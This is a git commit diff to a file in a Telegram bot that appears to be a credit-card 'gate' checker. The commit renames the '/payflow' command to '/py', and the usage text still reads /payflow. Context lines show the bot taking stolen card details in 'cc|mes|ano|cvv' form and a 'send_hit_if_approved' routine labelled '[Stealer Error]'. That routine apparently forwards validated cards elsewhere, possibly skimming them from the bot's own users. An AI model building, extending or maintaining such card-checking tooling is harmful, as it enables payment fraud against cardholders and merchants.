565a8a7767a8a4d355030ed39c16147b19357549
spxlau <buoyspilux@gmail.com>
2026-04-03 21:59:45 +0300

    Change command from '/payflow' to '/py'

--- BOT/newgates/payflow_20.py
+++ BOT/newgates/payflow_20.py
@@ -22,7 +22,7 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("payflow", [".", "/"]))
+@Client.on_message(filters.command("py", [".", "/"]))
 async def payflow_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
@@ -37,7 +37,7 @@ async def payflow_cmd(Client, message):
         role = checkall[1]
         getcc = await getmessage(message)
         if getcc == False:
-            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /payflow\n\nMessage: No CC Found in your input ❌\n\nUsage: /payflow cc|mes|ano|cvv</b>"""
+            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /py\n\nMessage: No CC Found in your input ❌\n\nUsage: /payflow cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
